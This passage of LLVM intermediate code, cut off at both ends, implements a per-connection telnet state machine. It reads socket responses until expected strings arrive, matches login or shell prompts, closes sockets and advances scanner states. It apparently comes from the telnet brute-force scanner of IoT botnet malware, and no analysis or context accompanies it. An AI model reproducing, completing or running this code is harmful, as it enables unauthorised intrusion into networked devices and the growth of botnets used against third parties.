  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1203
  %1205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1204, i32 0, i32 2
  store i8 6, i8* %1205, align 8
  br label %2310

1206:                                             ; preds = %70
  %1207 = load i32, i32* %2, align 4
  %1208 = sext i32 %1207 to i64
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1208
  %1210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1209, i32 0, i32 6
  %1211 = load i32, i32* %1210, align 4
  %1212 = icmp eq i32 %1211, 0
  br i1 %1212, label %1213, label %1220

1213:                                             ; preds = %1206
  %1214 = call i64 @time(i64* null) #12
  %1215 = trunc i64 %1214 to i32
  %1216 = load i32, i32* %2, align 4
  %1217 = sext i32 %1216 to i64
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1217
  %1219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1218, i32 0, i32 6
  store i32 %1215, i32* %1219, align 4
  br label %1220

1220:                                             ; preds = %1213, %1206
  %1221 = load i32, i32* %2, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1222
  %1224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1223, i32 0, i32 0
  %1225 = load i32, i32* %1224, align 16
  %1226 = load i32, i32* %2, align 4
  %1227 = sext i32 %1226 to i64
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1227
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1228, i32 0, i32 8
  %1230 = load i8*, i8** %1229, align 8
  %1231 = load i32, i32* %2, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1232
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1233, i32 0, i32 7
  %1235 = load i16, i16* %1234, align 16
  %1236 = zext i16 %1235 to i32
  %1237 = call i32 @readUntil(i32 %1225, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1230, i32 1024, i32 %1236)
  %1238 = icmp ne i32 %1237, 0
  br i1 %1238, label %1239, label %1314

1239:                                             ; preds = %1220
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 6
  store i32 0, i32* %1243, align 4
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1245
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1246, i32 0, i32 7
  store i16 0, i16* %1247, align 16
  %1248 = load i32, i32* %2, align 4
  %1249 = sext i32 %1248 to i64
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1249
  %1251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1250, i32 0, i32 8
  %1252 = load i8*, i8** %1251, align 8
  %1253 = call i8* @strstr(i8* %1252, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i64 0, i64 0)) #11
  %1254 = icmp ne i8* %1253, null
  br i1 %1254, label %1255, label %1275

1255:                                             ; preds = %1239
  %1256 = load i32, i32* %2, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 8
  %1260 = load i8*, i8** %1259, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1260, i8 0, i64 1024, i1 false)
  %1261 = load i32, i32* %2, align 4
  %1262 = sext i32 %1261 to i64
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1262
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1263, i32 0, i32 0
  %1265 = load i32, i32* %1264, align 16
  %1266 = call i32 @sclose(i32 %1265)
  %1267 = load i32, i32* %2, align 4
  %1268 = sext i32 %1267 to i64
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1268
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1269, i32 0, i32 2
  store i8 0, i8* %1270, align 8
  %1271 = load i32, i32* %2, align 4
  %1272 = sext i32 %1271 to i64
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1272
  %1274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1273, i32 0, i32 3
  store i8 0, i8* %1274, align 1
  br label %2311

1275:                                             ; preds = %1239
  %1276 = load i32, i32* %2, align 4
  %1277 = sext i32 %1276 to i64
  %1278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1277
  %1279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1278, i32 0, i32 8
  %1280 = load i8*, i8** %1279, align 8
  %1281 = call i32 @matchPrompt(i8* %1280)
  %1282 = icmp ne i32 %1281, 0
  br i1 %1282, label %1303, label %1283

1283:                                             ; preds = %1275
  %1284 = load i32, i32* %2, align 4
  %1285 = sext i32 %1284 to i64
  %1286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1285
  %1287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1286, i32 0, i32 8
  %1288 = load i8*, i8** %1287, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1288, i8 0, i64 1024, i1 false)
  %1289 = load i32, i32* %2, align 4
  %1290 = sext i32 %1289 to i64
  %1291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1290
  %1292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1291, i32 0, i32 0
  %1293 = load i32, i32* %1292, align 16
  %1294 = call i32 @sclose(i32 %1293)
  %1295 = load i32, i32* %2, align 4
  %1296 = sext i32 %1295 to i64
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1296
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1297, i32 0, i32 2
  store i8 0, i8* %1298, align 8
  %1299 = load i32, i32* %2, align 4
  %1300 = sext i32 %1299 to i64
  %1301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1300
  %1302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1301, i32 0, i32 3
  store i8 1, i8* %1302, align 1
  br label %2311

1303:                                             ; preds = %1275
  %1304 = load i32, i32* %2, align 4
  %1305 = sext i32 %1304 to i64
  %1306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1305
  %1307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1306, i32 0, i32 2
  store i8 7, i8* %1307, align 8
  br label %1308

1308:                                             ; preds = %1303
  %1309 = load i32, i32* %2, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1310
  %1312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1311, i32 0, i32 8
  %1313 = load i8*, i8** %1312, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1313, i8 0, i64 1024, i1 false)
  br label %2311

1314:                                             ; preds = %1220
  %1315 = load i32, i32* %2, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1316
  %1318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1317, i32 0, i32 0
  %1319 = load i32, i32* %1318, align 16
  %1320 = load i32, i32* %2, align 4
  %1321 = sext i32 %1320 to i64
  %1322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1321
  %1323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1322, i32 0, i32 8
  %1324 = load i8*, i8** %1323, align 8
  %1325 = load i32, i32* %2, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 7
  %1329 = load i16, i16* %1328, align 16
  %1330 = zext i16 %1329 to i32
  %1331 = call i32 @readUntil(i32 %1319, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1324, i32 1024, i32 %1330)
  %1332 = icmp ne i32 %1331, 0
  br i1 %1332, label %1333, label %1408

1333:                                             ; preds = %1314
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 6
  store i32 0, i32* %1337, align 4
  %1338 = load i32, i32* %2, align 4
  %1339 = sext i32 %1338 to i64
  %1340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1339
  %1341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1340, i32 0, i32 7
  store i16 0, i16* %1341, align 16
  %1342 = load i32, i32* %2, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 8
  %1346 = load i8*, i8** %1345, align 8
  %1347 = call i8* @strstr(i8* %1346, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i64 0, i64 0)) #11
  %1348 = icmp ne i8* %1347, null
  br i1 %1348, label %1349, label %1369

1349:                                             ; preds = %1333
  %1350 = load i32, i32* %2, align 4
  %1351 = sext i32 %1350 to i64
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1351
  %1353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1352, i32 0, i32 8
  %1354 = load i8*, i8** %1353, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1354, i8 0, i64 1024, i1 false)
  %1355 = load i32, i32* %2, align 4
  %1356 = sext i32 %1355 to i64
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1356
  %1358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1357, i32 0, i32 0
  %1359 = load i32, i32* %1358, align 16
  %1360 = call i32 @sclose(i32 %1359)
  %1361 = load i32, i32* %2, align 4
  %1362 = sext i32 %1361 to i64
  %1363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1362
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1363, i32 0, i32 2
  store i8 0, i8* %1364, align 8
  %1365 = load i32, i32* %2, align 4
  %1366 = sext i32 %1365 to i64
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1366
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1367, i32 0, i32 3
  store i8 0, i8* %1368, align 1
  br label %2311

1369:                                             ; preds = %1333
  %1370 = load i32, i32* %2, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 8
  %1374 = load i8*, i8** %1373, align 8
  %1375 = call i32 @matchPrompt(i8* %1374)
  %1376 = icmp ne i32 %1375, 0
  br i1 %1376, label %1397, label %1377

1377:                                             ; preds = %1369
  %1378 = load i32, i32* %2, align 4
  %1379 = sext i32 %1378 to i64
  %1380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1379
  %1381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1380, i32 0, i32 8
  %1382 = load i8*, i8** %1381, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1382, i8 0, i64 1024, i1 false)
  %1383 = load i32, i32* %2, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1384
  %1386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1385, i32 0, i32 0
  %1387 = load i32, i32* %1386, align 16
  %1388 = call i32 @sclose(i32 %1387)
  %1389 = load i32, i32* %2, align 4
  %1390 = sext i32 %1389 to i64
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 2
  store i8 0, i8* %1392, align 8
  %1393 = load i32, i32* %2, align 4
  %1394 = sext i32 %1393 to i64
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1394
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1395, i32 0, i32 3
  store i8 1, i8* %1396, align 1
  br label %2311

1397:                                             ; preds = %1369
  %1398 = load i32, i32* %2, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 2
  store i8 7, i8* %1401, align 8
  br label %1402

1402:                                             ; preds = %1397
  %1403 = load i32, i32* %2, align 4
  %1404 = sext i32 %1403 to i64
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1404
  %1406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1405, i32 0, i32 8
  %1407 = load i8*, i8** %1406, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1407, i8 0, i64 1024, i1 false)
  br label %2311

1408:                                             ; preds = %1314
  %1409 = load i32, i32* %2, align 4
  %1410 = sext i32 %1409 to i64
  %1411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1410
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1411, i32 0, i32 0
  %1413 = load i32, i32* %1412, align 16
  %1414 = load i32, i32* %2, align 4
  %1415 = sext i32 %1414 to i64
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1415
  %1417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1416, i32 0, i32 8
  %1418 = load i8*, i8** %1417, align 8
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 7
  %1423 = load i16, i16* %1422, align 16
  %1424 = zext i16 %1423 to i32
  %1425 = call i32 @readUntil(i32 %1413, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1418, i32 1024, i32 %1424)
  %1426 = icmp ne i32 %1425, 0
  br i1 %1426, label %1427, label %1474

1427:                                             ; preds = %1408
  %1428 = load i32, i32* %2, align 4
  %1429 = sext i32 %1428 to i64
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1429
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1430, i32 0, i32 6
  store i32 0, i32* %1431, align 4
  %1432 = load i32, i32* %2, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1433
  %1435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1434, i32 0, i32 7
  store i16 0, i16* %1435, align 16
  %1436 = load i32, i32* %2, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 8
  %1440 = load i8*, i8** %1439, align 8
  %1441 = call i8* @strstr(i8* %1440, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i64 0, i64 0)) #11
  %1442 = icmp ne i8* %1441, null
  br i1 %1442, label %1443, label %1463

1443:                                             ; preds = %1427
  %1444 = load i32, i32* %2, align 4
  %1445 = sext i32 %1444 to i64
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1445
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1446, i32 0, i32 8
  %1448 = load i8*, i8** %1447, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1448, i8 0, i64 1024, i1 false)
  %1449 = load i32, i32* %2, align 4
  %1450 = sext i32 %1449 to i64
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1450
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1451, i32 0, i32 0
  %1453 = load i32, i32* %1452, align 16
  %1454 = call i32 @sclose(i32 %1453)
  %1455 = load i32, i32* %2, align 4
  %1456 = sext i32 %1455 to i64
  %1457 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1456
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1457, i32 0, i32 2
  store i8 0, i8* %1458, align 8
  %1459 = load i32, i32* %2, align 4
  %1460 = sext i32 %1459 to i64
  %1461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1460
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1461, i32 0, i32 3
  store i8 0, i8* %1462, align 1
  br label %2311

1463:                                             ; preds = %1427
  %1464 = load i32, i32* %2, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1465
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1466, i32 0, i32 2
  store i8 7, i8* %1467, align 8
  br label %1468

1468:                                             ; preds = %1463
  %1469 = load i32, i32* %2, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 8
  %1473 = load i8*, i8** %1472, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1473, i8 0, i64 1024, i1 false)
  br label %2311

1474:                                             ; preds = %1408
  %1475 = load i32, i32* %2, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1476
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1477, i32 0, i32 0
  %1479 = load i32, i32* %1478, align 16
  %1480 = load i32, i32* %2, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1481
  %1483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1482, i32 0, i32 8
  %1484 = load i8*, i8** %1483, align 8
  %1485 = load i32, i32* %2, align 4
  %1486 = sext i32 %1485 to i64
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1486
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1487, i32 0, i32 7
  %1489 = load i16, i16* %1488, align 16
  %1490 = zext i16 %1489 to i32
  %1491 = call i32 @readUntil(i32 %1479, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1484, i32 1024, i32 %1490)
  %1492 = icmp ne i32 %1491, 0
  br i1 %1492, label %1493, label %1540

1493:                                             ; preds = %1474
  %1494 = load i32, i32* %2, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 6
  store i32 0, i32* %1497, align 4
  %1498 = load i32, i32* %2, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1499
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1500, i32 0, i32 7
  store i16 0, i16* %1501, align 16
  %1502 = load i32, i32* %2, align 4
  %1503 = sext i32 %1502 to i64
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1503
  %1505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1504, i32 0, i32 8
  %1506 = load i8*, i8** %1505, align 8
  %1507 = call i8* @strstr(i8* %1506, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i64 0, i64 0)) #11
  %1508 = icmp ne i8* %1507, null
  br i1 %1508, label %1509, label %1529

1509:                                             ; preds = %1493
  %1510 = load i32, i32* %2, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1511
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1512, i32 0, i32 8
  %1514 = load i8*, i8** %1513, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1514, i8 0, i64 1024, i1 false)
  %1515 = load i32, i32* %2, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 0
  %1519 = load i32, i32* %1518, align 16
  %1520 = call i32 @sclose(i32 %1519)
  %1521 = load i32, i32* %2, align 4
  %1522 = sext i32 %1521 to i64
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 2
  store i8 0, i8* %1524, align 8
  %1525 = load i32, i32* %2, align 4
  %1526 = sext i32 %1525 to i64
  %1527 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1526
  %1528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1527, i32 0, i32 3
  store i8 0, i8* %1528, align 1
  br label %2311

1529:                                             ; preds = %1493
  %1530 = load i32, i32* %2, align 4
  %1531 = sext i32 %1530 to i64
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1531
  %1533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1532, i32 0, i32 2
  store i8 7, i8* %1533, align 8
  br label %1534

1534:                                             ; preds = %1529
  %1535 = load i32, i32* %2, align 4
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1536
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1537, i32 0, i32 8
  %1539 = load i8*, i8** %1538, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1539, i8 0, i64 1024, i1 false)
  br label %2311

1540:                                             ; preds = %1474
  %1541 = load i32, i32* %2, align 4
  %1542 = sext i32 %1541 to i64
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1542
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1543, i32 0, i32 0
  %1545 = load i32, i32* %1544, align 16
  %1546 = load i32, i32* %2, align 4
  %1547 = sext i32 %1546 to i64
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1547
  %1549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1548, i32 0, i32 8
  %1550 = load i8*, i8** %1549, align 8
  %1551 = load i32, i32* %2, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1552
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1553, i32 0, i32 7
  %1555 = load i16, i16* %1554, align 16
  %1556 = zext i16 %1555 to i32
  %1557 = call i32 @readUntil(i32 %1545, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1550, i32 1024, i32 %1556)
  %1558 = icmp ne i32 %1557, 0
  br i1 %1558, label %1559, label %1606

1559:                                             ; preds = %1540
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 6
  store i32 0, i32* %1563, align 4
  %1564 = load i32, i32* %2, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 7
  store i16 0, i16* %1567, align 16
  %1568 = load i32, i32* %2, align 4
  %1569 = sext i32 %1568 to i64
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1569
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1570, i32 0, i32 8
  %1572 = load i8*, i8** %1571, align 8
  %1573 = call i8* @strstr(i8* %1572, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #11
  %1574 = icmp ne i8* %1573, null
  br i1 %1574, label %1575, label %1595

1575:                                             ; preds = %1559
  %1576 = load i32, i32* %2, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1577
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1578, i32 0, i32 8
  %1580 = load i8*, i8** %1579, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1580, i8 0, i64 1024, i1 false)
  %1581 = load i32, i32* %2, align 4
  %1582 = sext i32 %1581 to i64
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1582
  %1584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1583, i32 0, i32 0
  %1585 = load i32, i32* %1584, align 16
  %1586 = call i32 @sclose(i32 %1585)
  %1587 = load i32, i32* %2, align 4
  %1588 = sext i32 %1587 to i64
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 2
  store i8 0, i8* %1590, align 8
  %1591 = load i32, i32* %2, align 4
  %1592 = sext i32 %1591 to i64
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1592
  %1594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1593, i32 0, i32 3
  store i8 0, i8* %1594, align 1
  br label %2311

1595:                                             ; preds = %1559
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 2
  store i8 7, i8* %1599, align 8
  br label %1600

1600:                                             ; preds = %1595
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 8
  %1605 = load i8*, i8** %1604, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1605, i8 0, i64 1024, i1 false)
  br label %2311

1606:                                             ; preds = %1540
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 0
  %1611 = load i32, i32* %1610, align 16
  %1612 = load i32, i32* %2, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1613
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1614, i32 0, i32 8
  %1616 = load i8*, i8** %1615, align 8
  %1617 = load i32, i32* %2, align 4
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1618
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1619, i32 0, i32 7
  %1621 = load i16, i16* %1620, align 16
  %1622 = zext i16 %1621 to i32
  %1623 = call i32 @readUntil(i32 %1611, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1616, i32 1024, i32 %1622)
  %1624 = icmp ne i32 %1623, 0
  br i1 %1624, label %1625, label %1672

1625:                                             ; preds = %1606
  %1626 = load i32, i32* %2, align 4
  %1627 = sext i32 %1626 to i64
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1627
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1628, i32 0, i32 6
  store i32 0, i32* %1629, align 4
  %1630 = load i32, i32* %2, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 7
  store i16 0, i16* %1633, align 16
